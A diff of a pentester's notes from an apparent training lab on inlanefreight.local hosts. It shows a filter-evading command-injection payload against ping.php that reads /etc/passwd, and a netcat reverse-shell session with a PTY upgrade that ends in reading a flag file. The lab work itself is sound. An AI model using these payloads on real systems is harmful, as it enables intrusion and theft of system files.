@@ -241,6 +241,11 @@ Finished
 
 all the vhosts are put into /etc/hosts
 
+
+## blog.inlanefreight.local
+
+
+
 ## ir.inlanefreight.local
 
 img1
@@ -813,4 +818,40 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-07 06:25:
 
 ```
 /ping.php?ip=127.0.0.1%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+```
+
+
+```
+──(kali㉿kali)-[~/labs/aen]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.111] from (UNKNOWN) [10.129.41.101] 36740
+id
+uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+webdev@dmz01:/var/www/html/monitoring$ ^Z
+zsh: suspended  nc -lvnp 9001
+                                                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/labs/aen]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 9001
+
+webdev@dmz01:/var/www/html/monitoring$ id
+uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+webdev@dmz01:/var/www/html/monitoring$ ls /home
+lab_adm  pixel  srvadm  tom  webdev
+webdev@dmz01:/var/www/html/monitoring$ ls -la /home/srvadm
+total 32
+drwxr-xr-x 3 srvadm srvadm 4096 Jun  1  2022 .
+drwxr-xr-x 7 root   root   4096 May 30  2022 ..
+-rw------- 1 srvadm srvadm   48 Jun  1  2022 .bash_history
+-rw-r--r-- 1 srvadm srvadm  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 srvadm srvadm 3771 Feb 25  2020 .bashrc
+drwx------ 2 srvadm srvadm 4096 Jun  1  2022 .cache
+-rw-r--r-- 1 srvadm srvadm  807 Feb 25  2020 .profile
+-rw-r--r-- 1 srvadm srvadm   33 May 30  2022 flag.txt
+webdev@dmz01:/var/www/html/monitoring$ cat /home/srvadm/flag.txt
+b447c27a00e3a348881b0030177000cd
+webdev@dmz01:/var/www/html/monitoring$ 
+
 ```
